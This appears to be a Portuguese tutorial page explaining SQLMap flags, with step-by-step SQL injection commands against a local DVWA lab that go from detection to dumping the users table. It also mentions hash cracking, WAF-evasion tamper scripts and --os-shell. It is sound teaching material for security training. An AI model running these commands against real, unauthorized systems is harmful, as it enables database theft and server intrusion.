# 04 — Uso e Comandos

Guia prático das flags mais usadas do SQLMap. Os exemplos assumem o ambiente
[DVWA](03-ambiente-de-teste.md) rodando em `http://localhost`.

> ⚠️ Use estes comandos **apenas** contra o seu ambiente de teste ou alvos autorizados.

## Estrutura básica de um comando

```bash
python sqlmap.py -u "<URL>" [opções]
```

O fluxo típico é progressivo: **detectar → enumerar bancos → enumerar tabelas →
enumerar colunas → extrair dados**.

## Flags essenciais

| Flag | Para que serve |
|------|----------------|
| `-u`, `--url` | Define a URL alvo (com parâmetro a testar) |
| `--data` | Envia dados via POST (ex.: `--data="id=1&Submit=Submit"`) |
| `--cookie` | Envia cookies de sessão (necessário em áreas logadas como o DVWA) |
| `-p` | Especifica qual parâmetro testar |
| `--batch` | Aceita as respostas padrão (não-interativo) |
| `--dbs` | Lista os bancos de dados |
| `-D <banco>` | Seleciona um banco |
| `--tables` | Lista as tabelas (do banco escolhido) |
| `-T <tabela>` | Seleciona uma tabela |
| `--columns` | Lista as colunas |
| `-C <colunas>` | Seleciona colunas específicas |
| `--dump` | Extrai (faz dump) os dados |
| `--current-user` / `--current-db` | Usuário e banco atuais |
| `--level` (1–5) | Profundidade dos testes (mais pontos de injeção) |
| `--risk` (1–3) | Agressividade dos payloads |
| `--technique` | Restringe técnicas (`BEUSTQ`) |
| `--tamper` | Aplica scripts de evasão de WAF |
| `--os-shell` | Tenta abrir shell no SO do servidor |
| `--sql-shell` | Abre um shell SQL interativo |

## Exemplos progressivos (contra o DVWA)

Defina a URL e o cookie de sessão obtidos no DVWA (ver guia do ambiente):

```bash
URL='http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit'
COOKIE='security=low; PHPSESSID=<seu_phpsessid>'
```

### 1. Detectar a vulnerabilidade

```bash
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch
```

### 2. Identificar o usuário e banco atuais

```bash
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch --current-user --current-db
```

### 3. Listar os bancos de dados

```bash
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch --dbs
```

### 4. Listar tabelas do banco `dvwa`

```bash
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch -D dvwa --tables
```

### 5. Listar colunas da tabela `users`

```bash
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --columns
```

### 6. Extrair (dump) os dados da tabela `users`

```bash
python sqlmap.py -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --dump
```

O SQLMap reconhece os hashes de senha e oferece tentar **quebrá-los com dicionário**.

## Exemplo com POST

Se o formulário usar POST, capture o corpo da requisição e use `--data`:

```bash
python sqlmap.py -u "http://localhost/login.php" \
  --data="user=admin&pass=123" -p user --batch --dbs
```

## Dicas úteis

- `-r requisicao.txt`: passe uma requisição HTTP salva (ex.: do Burp Suite) em vez de
  montar `-u`/`--data`/`--cookie` à mão.
- `--threads 5`: acelera a extração (use com parcimônia).
- `--flush-session`: limpa resultados em cache de uma execução anterior.
- `--wizard`: modo guiado, ótimo para iniciantes e para a demo.
- `-v 3`: aumenta a verbosidade para mostrar os payloads (didático na apresentação).

---

⬅️ Anterior: [03 — Ambiente de Teste](03-ambiente-de-teste.md) | ➡️ Próximo: [05 — Roteiro](05-roteiro-apresentacao.md)
